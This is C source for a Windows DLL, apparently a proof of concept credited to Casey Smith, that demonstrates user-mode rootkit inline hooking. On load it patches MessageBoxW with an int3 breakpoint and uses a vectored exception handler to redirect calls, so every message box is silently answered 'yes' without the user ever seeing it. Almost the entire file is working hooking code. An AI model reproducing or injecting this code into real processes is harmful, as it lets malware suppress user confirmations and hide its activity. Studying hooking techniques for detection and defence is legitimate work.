#define SECURITY_WIN32 //Define First Before Imports.

#include <windows.h>
#include <stdio.h>


//Fix this, doesn't scale...

FARPROC fpReportEvent; //Pointer To The Original Location
BYTE bSavedByte; //Saved Byte Overwritten by 0xCC -

				 // Original Idea/Reference Blog Post Here:
				 // https://0x00sec.org/t/user-mode-rootkits-iat-and-inline-hooking/1108
				 // PoC by Casey Smith @subTee

				 //OK

BOOL WriteMemory(FARPROC fpFunc, LPCBYTE b, SIZE_T size) {
	DWORD dwOldProt = 0;
	if (VirtualProtect(fpFunc, size, PAGE_EXECUTE_READWRITE, &dwOldProt) == FALSE)
		return FALSE;
	//Safety Flush Cache 
	BOOL result = FlushInstructionCache(GetCurrentProcess(), NULL, NULL);
	MoveMemory(fpFunc, b, size);
	return VirtualProtect(fpFunc, size, dwOldProt, &dwOldProt);
}

//TODO, Combine  HOOK Function To take 2 params. DLL and Function Name.
VOID HookFunction(VOID) {
	fpReportEvent = GetProcAddress(LoadLibrary(L"user32.dll"), "MessageBoxW");
	if (fpReportEvent == NULL) {
		return;
	}

	bSavedByte = *(LPBYTE)fpReportEvent;

	const BYTE bInt3 = 0xCC;
	if (WriteMemory(fpReportEvent, &bInt3, sizeof(BYTE)) == FALSE) {
		ExitThread(0);
	}
}


int WINAPI MyMessageBox
(
	HWND hwnd,
	LPCTSTR lpText,
	LPCTSTR lpCaption,
	UINT    uType

)
{


	if (WriteMemory(fpReportEvent, &bSavedByte, sizeof(BYTE)) == FALSE) {
		ExitThread(0);
	}

	HookFunction();
	return 0x06;
}



LONG WINAPI
MyVectoredExceptionHandler1(
	struct _EXCEPTION_POINTERS *ExceptionInfo
)
{

	BOOL result = FlushInstructionCache(GetCurrentProcess(), NULL, NULL);
	UNREFERENCED_PARAMETER(ExceptionInfo);
#ifdef _WIN64
	if (ExceptionInfo->ContextRecord->Rip == (DWORD_PTR)fpReportEvent)
		ExceptionInfo->ContextRecord->Rip = (DWORD_PTR)MyMessageBox;
#else
	if (ExceptionInfo->ContextRecord->Eip == (DWORD_PTR)fpReportEvent)
		ExceptionInfo->ContextRecord->Eip = (DWORD_PTR)MyMessageBox;
#endif
	return EXCEPTION_CONTINUE_SEARCH;
}

BOOL APIENTRY DllMain(HANDLE hInstance, DWORD fdwReason, LPVOID lpReserved) {
	switch (fdwReason) {
	case DLL_PROCESS_ATTACH:
		AddVectoredExceptionHandler(1, (PVECTORED_EXCEPTION_HANDLER)MyVectoredExceptionHandler1);
		HookFunction();
		break;
	}
	return TRUE;
}
